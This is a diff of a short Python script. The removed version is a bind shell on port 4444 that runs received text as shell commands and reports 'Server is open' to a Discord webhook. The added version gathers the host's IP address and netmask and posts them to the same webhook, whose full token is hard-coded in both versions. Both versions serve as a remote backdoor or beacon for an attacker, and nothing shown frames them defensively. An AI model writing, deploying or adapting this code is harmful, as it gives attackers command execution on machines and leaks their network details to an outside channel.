@@ -1,27 +1,29 @@
 import requests
-import socket as s
-import subprocess as sp
+import socket
+import psutil 
 
-webhook_url = 'https://discord.com/api/webhooks/1209489160495304764/pSNsnAH07u8mAM3Ra9-oZTqhSZ5ysg_c5wLWAeepqdA-OPTEsxcQYH-Po1IIXHuiXQI2'  
+def get_ip_and_network():
+    hostname = socket.gethostname()
+    ip_address = socket.gethostbyname(hostname)
 
-def execute_and_notify():
-    try:
-        s1 = s.socket(s.AF_INET, s.SOCK_STREAM)
-        s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)
-        s1.bind(("0.0.0.0", 4444))
-        s1.listen(1)
-        c, a = s1.accept()
-        while True:
-            d = c.recv(1024).decode()
-            p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
-            c.sendall(p.stdout.read() + p.stderr.read())
+    # Find the appropriate network interface and its subnet mask
+    for name, nic_addrs in psutil.net_if_addrs().items():
+        for addr in nic_addrs:
+            if addr.family == socket.AF_INET and addr.address == ip_address:
+                network = addr.netmask
+                return ip_address, network
 
-        data = {"content": "Server is open"}
-        requests.post(webhook_url, json=data) 
-        print('Message sent successfully.')
+    return ip_address, "Network not found"
 
-    except Exception as e:
-        print('An error occurred:', e)
+def send_to_discord(webhook_url, message):
+    data = {"content": message}
+    response = requests.post(webhook_url, json=data)
+    if response.status_code != 204:  # 204 indicates successful message delivery
+        print("Error sending to Discord:", response.text)
 
 if __name__ == "__main__":
-    execute_and_notify()
+    webhook_url = "https://discord.com/api/webhooks/1209489160495304764/pSNsnAH07u8mAM3Ra9-oZTqhSZ5ysg_c5wLWAeepqdA-OPTEsxcQYH-Po1IIXHuiXQI2"  # Replace with your actual webhook URL
+
+    ip_address, network = get_ip_and_network()
+    message = f"Server is open! IP: {ip_address}, Network: {network}"
+    send_to_discord(webhook_url, message)
